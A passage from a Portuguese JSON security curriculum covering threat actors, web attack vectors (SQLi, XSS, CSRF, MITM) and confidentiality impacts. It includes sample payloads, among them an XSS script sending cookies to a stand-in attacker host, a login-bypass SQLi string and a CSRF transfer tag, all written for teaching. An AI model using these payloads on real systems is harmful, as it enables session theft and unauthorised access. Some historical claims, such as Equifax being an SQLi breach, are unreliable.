                                  "tips": "Comece com atores internos antes de externos para cobertura completa.",
                                  "learningObjective": "Aplicar mapeamento em contextos reais de apps web.",
                                  "commonMistakes": "Ignorar atores internos; não considerar evolução de sofisticação ao longo do tempo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Priorizar Defesas Baseado em Motivações e Capacidades",
                                  "subSteps": [
                                    "Atribua scores de risco: motivação alta + sofisticação alta = prioridade máxima.",
                                    "Liste controles: para baixa sofisticação (input validation), alta (zero-trust, monitoramento SIEM).",
                                    "Crie plano de priorização: top 3 defesas por ator.",
                                    "Simule orçamento: aloque recursos baseado em risco (ex: 40% para APTs).",
                                    "Revise e ajuste com feedback de pares ou ferramentas."
                                  ],
                                  "verification": "Plano de priorização com scores de risco e defesas associadas para todos atores mapeados.",
                                  "estimatedTime": "55 minutos",
                                  "materials": [
                                    "OWASP Proactive Controls",
                                    "NIST Cybersecurity Framework"
                                  ],
                                  "tips": "Use fórmula simples: Risco = Motivação * Sofisticação * Impacto.",
                                  "learningObjective": "Traduzir avaliação em ações defensivas priorizadas.",
                                  "commonMistakes": "Priorizar defesas genéricas sem ligação a atores específicos; ignorar custo-benefício."
                                }
                              ],
                              "practicalExample": "Em um e-commerce web, um ator com motivação financeira (script kiddie, baixa sofisticação) prioriza validação de inputs contra SQLi; um APT ideológico (alta sofisticação) exige criptografia end-to-end e monitoramento de logs para detecção de persistência.",
                              "finalVerifications": [
                                "Matriz de motivações e sofisticação completa para pelo menos 5 atores.",
                                "Plano de defesas priorizadas alinhado a riscos calculados.",
                                "Exemplos reais citados de pelo menos 3 breaches validados.",
                                "Scores de risco consistentes e justificáveis.",
                                "Cobertura de atores internos e externos.",
                                "Revisão de controles contra OWASP Top 10."
                              ],
                              "assessmentCriteria": [
                                "Precisão na categorização de motivações (90%+ correção).",
                                "Profundidade na avaliação de sofisticação com exemplos técnicos.",
                                "Qualidade da matriz e priorização (lógica e acionável).",
                                "Integração com vetores de apps web (OWASP alinhado).",
                                "Criatividade em cenários reais e plano de defesas.",
                                "Clareza e completude da documentação."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Análise comportamental de motivações humanas.",
                                "Gestão de Negócios: Priorização de riscos e alocação de orçamento.",
                                "Ética: Discussão de hacktivismo e responsabilidades sociais.",
                                "Estatística: Modelagem probabilística de riscos."
                              ],
                              "realWorldApplication": "Em equipes de DevSecOps, essa avaliação guia roadmaps de segurança, como priorizar MFA contra insiders financeiros em bancos online, reduzindo breaches em 30-50% conforme relatórios Verizon DBIR."
                            },
                            "estimatedTime": "0.75 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.2.2",
                        "name": "Vetores de Ataque Comuns",
                        "description": "Análise dos principais canais e métodos pelos quais atores exploram vulnerabilidades em aplicações web, com foco em entradas não sanitizadas e exposições de superfície.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.2.1",
                            "name": "Reconhecer vetores via entrada de usuário",
                            "description": "Identificar vetores como injeção SQL, XSS (Cross-Site Scripting) e CSRF (Cross-Site Request Forgery), explicando como entradas maliciosas em formulários ou URLs são exploradas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender conceitos básicos de entradas de usuário e riscos associados",
                                  "subSteps": [
                                    "Definir o que são entradas de usuário em aplicações web (formulários, URLs, parâmetros GET/POST).",
                                    "Explicar por que entradas não validadas representam vetores de ataque.",
                                    "Listar exemplos comuns de entradas maliciosas (scripts, comandos SQL).",
                                    "Discutir o princípio 'nunca confie na entrada do usuário'.",
                                    "Analisar o ciclo de vida de uma requisição web vulnerável."
                                  ],
                                  "verification": "Escrever um parágrafo resumindo os riscos das entradas não sanitizadas e listar 3 exemplos de vetores.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação OWASP Top 10",
                                    "Vídeo introdutório sobre segurança web (YouTube/Khan Academy)"
                                  ],
                                  "tips": [
                                    "Use analogias como 'porta aberta' para entradas não validadas.",
                                    "Anote exemplos reais para fixar o conceito."
                                  ],
                                  "learningObjective": "Entender o papel das entradas de usuário como porta de entrada para ataques.",
                                  "commonMistakes": [
                                    "Confundir vetores com ataques de rede (ex: DDoS).",
                                    "Ignorar que URLs também são entradas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar Injeção SQL (SQL Injection)",
                                  "subSteps": [
                                    "Explicar o que é SQL Injection: inserção de código SQL malicioso via input.",
                                    "Analisar um exemplo: input ' OR 1=1 -- em campo de login.",
                                    "Descrever como o banco de dados interpreta o input concatenado.",
                                    "Identificar payloads comuns como UNION SELECT ou DROP TABLE.",
                                    "Discutir impactos: roubo de dados, alteração ou exclusão."
                                  ],
                                  "verification": "Identificar e explicar um payload SQL injetado em um formulário de login simulado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta online como SQLi Lab (PortSwigger)",
                                    "Exemplos de código PHP vulnerável"
                                  ],
                                  "tips": [
                                    "Teste em ambientes simulados como DVWA (Damn Vulnerable Web App).",
                                    "Sempre escape inputs com prepared statements."
                                  ],
                                  "learningObjective": "Reconhecer padrões de Injeção SQL em entradas de usuário.",
                                  "commonMistakes": [
                                    "Pensar que só afeta logins.",
                                    "Não notar o uso de aspas simples para quebra."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Cross-Site Scripting (XSS)",
                                  "subSteps": [
                                    "Definir XSS: injeção de scripts maliciosos em páginas vistas por outros usuários.",
                                    "Diferenciar tipos: Reflected, Stored e DOM-based.",
                                    "Exemplo: <script>alert('XSS')</script> em campo de busca ou comentário.",
                                    "Explicar execução no navegador da vítima via HTML/JS.",
                                    "Discutir roubo de cookies, session hijacking ou phishing."
                                  ],
                                  "verification": "Classificar 3 exemplos de payloads XSS e explicar o impacto em um cenário de formulário.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Burp Suite Community Edition",
                                    "OWASP XSS Filter Evasion Cheat Sheet"
                                  ],
                                  "tips": [
                                    "Inspecione o código fonte da página para ver injeções.",
                                    "Use encodeURIComponent para sanitizar."
                                  ],
                                  "learningObjective": "Identificar scripts maliciosos em entradas de formulários e URLs.",
                                  "commonMistakes": [
                                    "Confundir com SQLi (XSS é client-side).",
                                    "Ignorar reflected XSS em URLs."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Cross-Site Request Forgery (CSRF)",
                                  "subSteps": [
                                    "Explicar CSRF: truque para executar ações não autorizadas em nome do usuário logado.",
                                    "Descrever mecanismo: link ou form malicioso em site externo.",
                                    "Exemplo: <img src='http://banco.com/transferir?valor=1000&conta=atacante'>.",
                                    "Discutir uso de cookies automáticos e falta de tokens anti-CSRF.",
                                    "Analisar impactos: transferências financeiras, mudanças de senha."
                                  ],
                                  "verification": "Montar um exemplo simples de página CSRF e explicar como detectá-lo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Exemplo prático em OWASP WebGoat",
                                    "Documentação sobre tokens CSRF"
                                  ],
                                  "tips": [
                                    "Verifique se ações críticas usam tokens únicos.",
                                    "Teste deslogado vs logado."
                                  ],
                                  "learningObjective": "Reconhecer ataques CSRF via entradas indiretas como imagens ou links.",
                                  "commonMistakes": [
                                    "Confundir com XSS (CSRF não injeta código).",
                                    "Subestimar ataques cross-site."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar reconhecimento e distinção dos vetores",
                                  "subSteps": [
                                    "Comparar os 3 vetores: SQLi (DB), XSS (browser), CSRF (state-changing).",
                                    "Analisar logs ou payloads mistos para identificar o vetor principal.",
                                    "Simular detecção em cenários reais (formulário vulnerável).",
                                    "Discutir defesas comuns: validação, sanitização, tokens.",
                                    "Criar um checklist para identificar vetores em apps."
                                  ],
                                  "verification": "Dado um cenário de input malicioso, classificar o vetor e propor mitigação.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramentas como DVWA ou bWAPP",
                                    "Lista de payloads OWASP"
                                  ],
                                  "tips": [
                                    "Pratique com labs vulneráveis em VM local.",
                                    "Registre payloads testados."
                                  ],
                                  "learningObjective": "Diferenciar e reconhecer vetores de ataque via entrada de usuário.",
                                  "commonMistakes": [
                                    "Não considerar contexto (ex: SQLi só em DB queries).",
                                    "Ignorar combinações de vetores."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um site de e-commerce, um atacante insere no campo de busca: '<script>document.location='http://atacante.com/steal?cookie='+document.cookie</script>'. Isso reflete XSS, roubando cookies do usuário logado ao visualizar resultados. Similarmente, em login: ' OR 1=1 -- causa SQLi, bypassando autenticação.",
                              "finalVerifications": [
                                "Listar e definir corretamente SQLi, XSS e CSRF.",
                                "Identificar vetor em 5 payloads de exemplo fornecidos.",
                                "Explicar impacto de cada vetor em um app web real.",
                                "Propor uma defesa básica para cada um.",
                                "Criar um diagrama simples de fluxo de ataque para XSS.",
                                "Diferenciar vetores em cenários mistos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de payloads (90% acerto).",
                                "Explicação clara do mecanismo de exploração.",
                                "Uso de exemplos concretos e relevantes.",
                                "Compreensão de impactos (dados, sessão, ações).",
                                "Sugestões de mitigação OWASP-compliant.",
                                "Capacidade de distinção entre os 3 vetores."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web (HTML, JS, PHP para simulações).",
                                "Banco de Dados (SQL para entender queries manipuladas).",
                                "Ética e Legislação (LGPD/GDPR em breaches).",
                                "Redes e Sistemas (protocolos HTTP e cookies).",
                                "Programação Segura (práticas de coding defensivo)."
                              ],
                              "realWorldApplication": "Em desenvolvimento de apps web como e-commerces ou bancos online, reconhecer esses vetores previne breaches massivos, como o SQLi no Equifax (147M registros vazados) ou XSS no Twitter (roubo de contas). Profissionais usam isso para auditar forms/URLs, implementando OWASP guidelines e reduzindo riscos em 80%."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.2.2",
                            "name": "Analisar vetores de rede e autenticação",
                            "description": "Descrever ataques como MITM (Man-in-the-Middle), quebra de sessões e autenticação fraca, destacando falhas em HTTPS e gerenciamento de cookies.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Ataques Man-in-the-Middle (MITM) e Falhas em HTTPS",
                                  "subSteps": [
                                    "Definir MITM e seus tipos (ex: ARP spoofing, DNS spoofing)",
                                    "Explicar o fluxo de um ataque MITM em rede não criptografada",
                                    "Analisar como HTTPS (TLS/SSL) previne MITM via handshake e certificados",
                                    "Identificar falhas comuns em HTTPS como certificados auto-assinados ou HSTS ausente",
                                    "Estudar exemplos reais de MITM em WiFi público"
                                  ],
                                  "verification": "Desenhar um diagrama de fluxo de um ataque MITM e explicar como HTTPS o bloqueia",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Wireshark para captura de pacotes",
                                    "Documentação OWASP sobre MITM",
                                    "Vídeos tutoriais sobre TLS handshake"
                                  ],
                                  "tips": [
                                    "Visualize o tráfego com ferramentas gratuitas antes de implementar HTTPS",
                                    "Sempre verifique certificados em browsers"
                                  ],
                                  "learningObjective": "Entender os mecanismos de MITM e o papel protetor do HTTPS",
                                  "commonMistakes": [
                                    "Confundir MITM com eavesdropping passivo",
                                    "Ignorar a importância do certificate pinning"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Gerenciamento de Cookies e Quebra de Sessões",
                                  "subSteps": [
                                    "Explicar como cookies armazenam sessões (session ID)",
                                    "Descrever ataques de quebra de sessão via roubo de cookies (ex: XSS, sniffing)",
                                    "Analisar flags de segurança em cookies: Secure, HttpOnly, SameSite",
                                    "Simular roubo de cookie em ambiente controlado",
                                    "Discutir mitigações como token binding e session fingerprinting"
                                  ],
                                  "verification": "Identificar e corrigir flags inseguras em um exemplo de cookie HTTP",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Browser Developer Tools (Chrome/Firefox)",
                                    "OWASP Cookie Security Cheat Sheet",
                                    "Ferramenta Burp Suite Community Edition"
                                  ],
                                  "tips": [
                                    "Use DevTools para inspecionar cookies em tempo real",
                                    "Implemente SameSite=Strict por padrão"
                                  ],
                                  "learningObjective": "Dominar vulnerabilidades em cookies e estratégias de proteção de sessões",
                                  "commonMistakes": [
                                    "Esquecer HttpOnly permitindo acesso via JavaScript",
                                    "Subestimar impactos de cookies sem Secure em HTTP"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar Falhas em Autenticação Fraca",
                                  "subSteps": [
                                    "Classificar tipos de autenticação fraca (senhas fracas, sem MFA, credenciais em claro)",
                                    "Analisar vetores como brute force, credential stuffing em autenticação de rede",
                                    "Explorar falhas em protocolos como Basic Auth sem HTTPS",
                                    "Discutir OAuth/OpenID falhas comuns em fluxos de autenticação",
                                    "Listar melhores práticas: hashing (bcrypt), rate limiting, MFA"
                                  ],
                                  "verification": "Avaliar um fluxo de login fictício e listar 3 falhas de autenticação",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "OWASP Authentication Cheat Sheet",
                                    "Ferramentas como Hydra para simular brute force (em lab isolado)",
                                    "Documentos sobre OAuth 2.0 security"
                                  ],
                                  "tips": [
                                    "Sempre combine autenticação com autorização",
                                    "Teste autenticação em staging antes de produção"
                                  ],
                                  "learningObjective": "Identificar e mitigar riscos de autenticação inadequada em contextos de rede",
                                  "commonMistakes": [
                                    "Usar MD5/SHA1 para hashing de senhas",
                                    "Expor tokens em URLs ou logs"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar e Analisar Vetores de Rede e Autenticação",
                                  "subSteps": [
                                    "Mapear interseções: MITM roubando credenciais/sessões",
                                    "Analisar cenários compostos (ex: MITM + autenticação fraca)",
                                    "Realizar threat modeling para uma app web com esses vetores",
                                    "Propor defesas holísticas: HTTPS everywhere, secure headers",
                                    "Documentar relatório de análise de vetores"
                                  ],
                                  "verification": "Criar um threat model diagram (STRIDE) para app web vulnerável",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramenta draw.io para diagramas",
                                    "OWASP Threat Modeling Cheat Sheet",
                                    "Exemplos de relatórios de segurança"
                                  ],
                                  "tips": [
                                    "Use STRIDE para sistematizar análise",
                                    "Priorize vetores de alto impacto"
                                  ],
                                  "learningObjective": "Sintetizar conhecimentos para análise abrangente de vetores de ataque",
                                  "commonMistakes": [
                                    "Isolar vetores sem considerar chains de ataque",
                                    "Ignorar contexto de rede em autenticação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Kali Linux e Wireshark, configure ARP spoofing para MITM em tráfego HTTP de um site de login, capture cookies de sessão sem HTTPS, demonstre quebra via replay, e migre para HTTPS com HSTS para validar proteção.",
                              "finalVerifications": [
                                "Explicar MITM em 3 frases com diagrama",
                                "Listar 4 falhas em cookies e mitigações",
                                "Descrever 3 tipos de autenticação fraca com exemplos",
                                "Analisar chain: MITM + sessão roubada + login fraco",
                                "Identificar ausência de HTTPS em snippet de código",
                                "Simular verificação de certificado inválido",
                                "Relatar threat model completo"
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica nas descrições (90%+ correto)",
                                "Uso de exemplos reais e diagramas claros",
                                "Cobertura completa de sub-vetores (MITM, cookies, auth)",
                                "Profundidade em mitigações e verificações",
                                "Clareza na integração de conceitos",
                                "Criatividade em practical example",
                                "Alinhamento com OWASP standards"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de roteamento e sniffing",
                                "Criptografia: TLS/SSL e hashing de senhas",
                                "Desenvolvimento Web: Session management em frameworks (Node.js, Django)",
                                "Ética e Governança: Conformidade GDPR/ LGPD em dados sensíveis",
                                "Análise de Dados: Log analysis para detecção de ataques"
                              ],
                              "realWorldApplication": "Em e-commerce como Amazon, análise desses vetores previne roubo de sessões de carrinho de compras via WiFi público, protegendo milhões em transações diárias e evitando breaches como o da Equifax."
                            },
                            "estimatedTime": "0.75 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.2.3",
                            "name": "Mapear vetores baseados em OWASP",
                            "description": "Referenciar o OWASP Top 10 para listar e priorizar vetores como broken access control e insecure deserialization em contextos de aplicações internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Familiarizar-se com o OWASP Top 10",
                                  "subSteps": [
                                    "Acesse o site oficial do OWASP e baixe a versão mais recente do OWASP Top 10.",
                                    "Leia a introdução e o escopo do OWASP Top 10, entendendo que ele lista as 10 principais riscos de segurança em aplicações web.",
                                    "Identifique os 10 vetores principais, como A01: Broken Access Control, A02: Cryptographic Failures, etc.",
                                    "Anote definições breves e exemplos iniciais para cada um.",
                                    "Compare com versões anteriores para entender evoluções, como de Insecure Deserialization para A08: Software and Data Integrity Failures."
                                  ],
                                  "verification": "Criar um resumo de 1 página listando os 10 itens com descrições curtas; autoavaliar se cobre todos os itens principais.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Site OWASP (owasp.org), navegador web, bloco de notas ou editor de texto (ex: Notion, Google Docs).",
                                  "tips": "Use a versão mais recente (2021 ou posterior) e foque em contextos de aplicações internet modernas.",
                                  "learningObjective": "Compreender o escopo e a relevância do OWASP Top 10 como referência padrão para vetores de ataque web.",
                                  "commonMistakes": "Confundir OWASP Top 10 com listas genéricas de vulnerabilidades; ignorar mudanças entre versões."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Listar e Descrever Vetores de Ataque Comuns",
                                  "subSteps": [
                                    "Liste os 10 vetores do OWASP Top 10 em uma tabela: nome, descrição, exemplos de impacto.",
                                    "Para cada vetor (ex: Broken Access Control), descreva cenários como elevação de privilégios ou IDOR (Insecure Direct Object References).",
                                    "Inclua vetores específicos como Insecure Deserialization: explique ataques como gadget chains em Java.",
                                    "Classifique cada vetor por categoria (ex: autenticação, injeção, configuração).",
                                    "Pesquise CVEs reais associados a cada vetor para ilustrar."
                                  ],
                                  "verification": "Tabela completa com 10 vetores, cada um com pelo menos 2 exemplos e 1 CVE; revisar por completude.",
                                  "estimatedTime": "3 horas",
                                  "materials": "OWASP Top 10 PDF, site NIST NVD para CVEs, planilha (Google Sheets ou Excel).",
                                  "tips": "Use cores na tabela para destacar severidade (CWSS scores do OWASP).",
                                  "learningObjective": "Identificar e detalhar vetores de ataque OWASP com exemplos concretos em aplicações web.",
                                  "commonMistakes": "Listar vetores sem contexto web/internet; copiar descrições sem entender impactos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Priorizar Vetores em um Contexto Específico",
                                  "subSteps": [
                                    "Escolha um contexto de aplicação internet (ex: app de e-commerce).",
                                    "Avalie risco de cada vetor usando fatores: probabilidade (frequência de exploits), impacto (danos potenciais), facilidade de mitigação.",
                                    "Atribua scores (1-10) para cada fator e calcule prioridade (média ponderada).",
                                    "Ordene os vetores do mais alto para o mais baixo risco no contexto escolhido.",
                                    "Justifique priorizações com evidências, como estatísticas OWASP ou casos reais."
                                  ],
                                  "verification": "Relatório de priorização com tabela de scores e ranking; scores somam logicamente.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Planilha para cálculos, dados OWASP (estatísticas de incidência), exemplos de apps reais.",
                                  "tips": "Pondere impacto mais alto (ex: 50%) em contextos com dados sensíveis.",
                                  "learningObjective": "Aplicar análise de risco para priorizar vetores OWASP em cenários reais de aplicações web.",
                                  "commonMistakes": "Priorizar subjetivamente sem métricas; ignorar contexto específico da aplicação."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mapear Vetores para uma Aplicação Exemplo",
                                  "subSteps": [
                                    "Desenhe um diagrama simples da aplicação (ex: fluxos de usuário em um blog web).",
                                    "Mapeie cada vetor priorizado para pontos vulneráveis no diagrama (ex: Broken Access Control em endpoints de admin).",
                                    "Descreva ataques potenciais e vetores de exploração para 5-7 principais.",
                                    "Sugira mapeamento visual usando ferramentas como Draw.io.",
                                    "Documente em um relatório com diagrama e legendas."
                                  ],
                                  "verification": "Diagrama anotado com pelo menos 8 vetores mapeados; simular um ataque mentalmente em cada.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ferramenta de diagramação (Draw.io, Lucidchart), relatório em Markdown ou Word.",
                                  "tips": "Use setas para mostrar fluxos de ataque no diagrama.",
                                  "learningObjective": "Criar mapeamentos visuais de vetores OWASP para componentes de aplicações web.",
                                  "commonMistakes": "Mapeamentos genéricos sem ligar a fluxos reais; diagramas muito complexos ou vagos."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar e Validar o Mapeamento Completo",
                                  "subSteps": [
                                    "Compile todos os artefatos em um documento final: lista, priorização, diagrama.",
                                    "Valide contra OWASP: verifique se todos os 10 estão cobertos e priorizados corretamente.",
                                    "Simule revisão por pares: liste gaps e refine.",
                                    "Adicione recomendações iniciais de mitigação para top 3.",
                                    "Exporte como PDF para portfólio."
                                  ],
                                  "verification": "Documento final de 5-10 páginas; checklist de cobertura OWASP 100%.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Editor de documentos (Google Docs), checklist OWASP personalizada.",
                                  "tips": "Use templates OWASP para relatórios de threat modeling.",
                                  "learningObjective": "Consolidar mapeamento em artefato profissional validado.",
                                  "commonMistakes": "Omitir validação; documento desorganizado sem sumário."
                                }
                              ],
                              "practicalExample": "Em um e-commerce web: mapear A01 Broken Access Control para endpoints de checkout permitindo acesso não autorizado a descontos; priorizar alto devido a impacto financeiro; diagramar fluxo usuário-admin-venda com vetores destacados.",
                              "finalVerifications": [
                                "Lista completa dos 10 vetores OWASP com descrições precisas.",
                                "Priorização com scores numéricos justificados para contexto específico.",
                                "Diagrama visual mapeando pelo menos 8 vetores a componentes da app.",
                                "Inclusão de exemplos reais (CVEs) para 70% dos vetores.",
                                "Relatório documentado com recomendações iniciais para top 3.",
                                "Validação contra fonte OWASP sem discrepâncias."
                              ],
                              "assessmentCriteria": [
                                "Precisão factual: 100% alinhado ao OWASP Top 10 oficial (30%).",
                                "Completude: Todos os 10 vetores cobertos com detalhes (25%).",
                                "Análise de priorização: Lógica baseada em risco contextual (20%).",
                                "Qualidade visual e estrutura: Diagramas claros e relatório organizado (15%).",
                                "Profundidade de exemplos: CVEs e cenários realistas (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento de Software: Integração em threat modeling no SDLC.",
                                "Análise de Riscos: Aplicação de metodologias como STRIDE ou CWSS.",
                                "Redes e Sistemas: Correlação com ataques de rede (ex: injection via API).",
                                "Ética e Governança: Conformidade com regulamentações como LGPD/GDPR."
                              ],
                              "realWorldApplication": "Em equipes de DevSecOps, mapear OWASP guia auditorias de segurança, pentests e roadmaps de hardening para apps como bancos online ou SaaS, reduzindo breaches em 40-60% conforme dados OWASP."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.2.3",
                        "name": "Impactos Potenciais de Ameaças",
                        "description": "Avaliação dos efeitos das explorações bem-sucedidas, alinhados ao triad CIA (Confidencialidade, Integridade, Disponibilidade) e impactos secundários.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.3.1",
                            "name": "Impactos na confidencialidade",
                            "description": "Explicar violações como roubo de dados sensíveis (PII, credenciais), resultando em exposição de informações privadas e conformidade regulatória (LGPD/GDPR).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entendendo o conceito de confidencialidade em aplicações web",
                                  "subSteps": [
                                    "Defina confidencialidade como a garantia de que informações sensíveis só sejam acessíveis por usuários autorizados.",
                                    "Estude a tríade CIA (Confidencialidade, Integridade, Disponibilidade) e foque no papel da confidencialidade.",
                                    "Analise exemplos básicos de perda de confidencialidade, como acesso não autorizado a dados.",
                                    "Diferencie confidencialidade de outros pilares da segurança.",
                                    "Registre em um mapa mental os elementos chave da confidencialidade."
                                  ],
                                  "verification": "Explique em suas palavras o que é confidencialidade e dê um exemplo simples de violação.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo sobre tríade CIA",
                                    "Vídeo introdutório de segurança web (5 min)",
                                    "Papel e caneta para mapa mental"
                                  ],
                                  "tips": "Use analogias cotidianas, como trancar uma porta, para fixar o conceito.",
                                  "learningObjective": "Compreender o conceito fundamental de confidencialidade no contexto de segurança de aplicações web.",
                                  "commonMistakes": [
                                    "Confundir confidencialidade com disponibilidade",
                                    "Ignorar o contexto de aplicações web",
                                    "Subestimar a importância da autorização"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificando dados sensíveis: PII e credenciais",
                                  "subSteps": [
                                    "Liste tipos de PII (Personally Identifiable Information), como CPF, email, endereço e dados biométricos.",
                                    "Descreva credenciais como senhas, tokens de autenticação e chaves API.",
                                    "Classifique dados sensíveis por nível de risco em uma aplicação web.",
                                    "Pesquise exemplos reais de PII em formulários de cadastro online.",
                                    "Crie uma tabela comparativa entre PII e credenciais não sensíveis."
                                  ],
                                  "verification": "Elabore uma lista de 5 exemplos de PII e 3 de credenciais, justificando por que são sensíveis.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Lista oficial de PII da LGPD",
                                    "Documentação de autenticação web (OAuth)",
                                    "Planilha ou editor de texto"
                                  ],
                                  "tips": "Sempre pergunte: 'Isso identifica ou autentica uma pessoa?' para classificar dados.",
                                  "learningObjective": "Identificar e categorizar dados sensíveis como PII e credenciais em contextos de aplicações web.",
                                  "commonMistakes": [
                                    "Considerar emails como não sensíveis",
                                    "Ignorar dados indiretos como combinações de informações",
                                    "Confundir com dados públicos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicando violações de confidencialidade e roubo de dados",
                                  "subSteps": [
                                    "Descreva métodos comuns de roubo: injeção SQL, XSS, interceptação de tráfego (MITM).",
                                    "Simule um cenário de roubo de credenciais via phishing em uma aplicação web.",
                                    "Analise como dados sensíveis são expostos em logs não protegidos ou APIs sem autenticação.",
                                    "Estude casos de breaches onde PII foi roubado.",
                                    "Desenhe um fluxograma de uma violação típica de confidencialidade."
                                  ],
                                  "verification": "Descreva um método de roubo de dados e como ele afeta a confidencialidade.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "OWASP Top 10 (seção de broken access control)",
                                    "Ferramenta de diagrama online (Draw.io)",
                                    "Vídeos de demonstração de SQL injection"
                                  ],
                                  "tips": "Foque em vetores web-specific: pense em inputs do usuário como portas de entrada.",
                                  "learningObjective": "Explicar mecanismos de violações que levam ao roubo de dados sensíveis em apps web.",
                                  "commonMistakes": [
                                    "Limitar a violações físicas, ignorando ataques cibernéticos",
                                    "Não ligar o roubo à confidencialidade",
                                    "Subestimar ataques de rede"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisando impactos: exposição de dados e conformidade regulatória",
                                  "subSteps": [
                                    "Descreva consequências da exposição: roubo de identidade, fraudes financeiras.",
                                    "Estude LGPD e GDPR: multas, obrigações de notificação de breaches.",
                                    "Calcule impactos qualitativos (danos à reputação) e quantitativos (multas).",
                                    "Compare violações sob LGPD vs GDPR em cenários brasileiros.",
                                    "Elabore um relatório fictício de incidente de confidencialidade."
                                  ],
                                  "verification": "Redija um parágrafo sobre impactos de uma violação sob LGPD, citando exemplos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Texto da LGPD (artigos 46-49)",
                                    "Casos de multas GDPR",
                                    "Modelo de relatório de incidente"
                                  ],
                                  "tips": "Ligue sempre o impacto regulatório ao negócio: multas podem quebrar empresas.",
                                  "learningObjective": "Avaliar os impactos de violações de confidencialidade, incluindo conformidade com LGPD/GDPR.",
                                  "commonMistakes": [
                                    "Focar só em multas, ignorando danos humanos",
                                    "Confundir LGPD com leis trabalhistas",
                                    "Não considerar notificações obrigatórias"
                                  ]
                                }
                              ],
                              "practicalExample": "Em 2019, o vazamento de dados do app 'Meu INSS' expôs PII de milhões de brasileiros, incluindo CPF e dados de benefícios. Isso resultou em investigações da ANPD por violação da LGPD, exposição a fraudes e perda de confiança pública, demonstrando roubo de credenciais via falhas em APIs não autenticadas.",
                              "finalVerifications": [
                                "Defina confidencialidade e dê 3 exemplos de dados sensíveis.",
                                "Explique 2 métodos de roubo de PII em apps web.",
                                "Descreva 2 impactos regulatórios da LGPD em uma violação.",
                                "Compare uma violação sob GDPR vs LGPD.",
                                "Liste 3 medidas preventivas para confidencialidade."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição de confidencialidade e dados sensíveis (30%)",
                                "Detalhamento de violações e métodos de roubo (25%)",
                                "Análise completa de impactos regulatórios (LGPD/GDPR) (20%)",
                                "Uso de exemplos reais e conexões lógicas (15%)",
                                "Clareza e estrutura na explicação (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Direito Digital: Estudo da LGPD e direitos fundamentais.",
                                "Ética em TI: Responsabilidade moral na proteção de dados.",
                                "Gestão de Riscos: Análise de impactos empresariais.",
                                "Desenvolvimento de Software: Integração de segurança no ciclo de vida."
                              ],
                              "realWorldApplication": "Desenvolvedores de e-commerce usam criptografia (HTTPS/TLS) e controles de acesso para proteger PII de clientes, evitando multas da LGPD e mantendo a confiança, como no caso de plataformas como Mercado Livre que implementam OAuth para credenciais seguras."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.3.2",
                            "name": "Impactos na integridade",
